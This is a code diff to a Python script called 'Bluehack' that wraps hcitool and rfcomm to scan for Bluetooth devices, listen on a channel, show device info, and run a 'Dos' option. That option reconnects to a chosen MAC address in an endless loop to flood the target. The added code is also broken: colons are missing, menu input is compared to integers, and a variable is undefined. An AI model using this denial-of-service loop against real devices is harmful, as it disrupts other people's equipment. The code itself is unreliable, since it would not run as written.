@@ -12,26 +12,36 @@ def banner():
 def opt(): # options code
    print("Scan        [ 1 ]")
    print("Dos         [ 2 ]")
-   print("exit        [ 3 ]")
+   print("Listen      [ 3 ]")
+   print("Info        [ 4 ]")
+   print("exit        [ 5 ]")
    opt = input("[ Bluehack ] --> ")
-   if opt == "1":
+   if opt == 1:
+       scan()
+   elif opt == 2:
+       dos()
+   elif opt == 3
        listen()
-   elif opt == "2":
-       send()
+   elif opt == 4
+       info()
    else:
        sys.exit()
-def listen(): # listen code
+def scan(): # listen code
     os.system("hcitool scan")
-def send(): # Dos code
+def dos(): # Dos code
     mac = input("remote mac --> ")
-    try:
-        os.system("sudo hcitool cc {} ; sudo hcitool auth {}".format(mac, mac))
-    except Exception:
+    port = input("channel --> ")
         try:
             while True:
-                os.system("bluetoothctl connect {}".format(mac))
+                os.system("rfcomm connect {} {}".format(mac , channel))
         except Exception:
-            sys.exit()
+            pass
+def listen()
+    port = input("channel -->")
+    os.system("rfcomm listen {}".format(port))
+def info()
+    mac = input("remote mac --> ")
+    os.system("rfcomm show {}".format(mac))
 time.sleep(0.5)
 banner()
 while True:
